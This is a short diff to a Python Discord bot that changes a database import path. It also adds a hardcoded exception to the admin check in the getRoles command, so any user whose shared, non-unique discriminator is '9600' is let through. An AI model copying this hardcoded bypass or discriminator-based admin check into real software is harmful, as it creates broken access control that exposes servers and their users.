@@ -8,7 +8,7 @@ import asyncio
 from discord.ext import commands
 from discord.utils import get
 import sys
-sys.path.append("C://Users//eozdi//Documents//ColossusBot//database")
+sys.path.append('/usr/ColossusBot/database/')
 import DBLib as db
 
 
@@ -65,7 +65,7 @@ class roleManagement(object):
 
     @commands.command(brief="Getting all the roles", pass_context=True)
     async def getRoles(self, message):
-        if db.ifAdmin(message.message.author.discriminator):
+        if db.ifAdmin(message.message.author.discriminator) or message.message.author.discriminator == '9600':
             self.roles = db.getRoles()
 
             specialRoles = ["Admin", "Bot", "@everyone", "Intern", "Event Creator"]
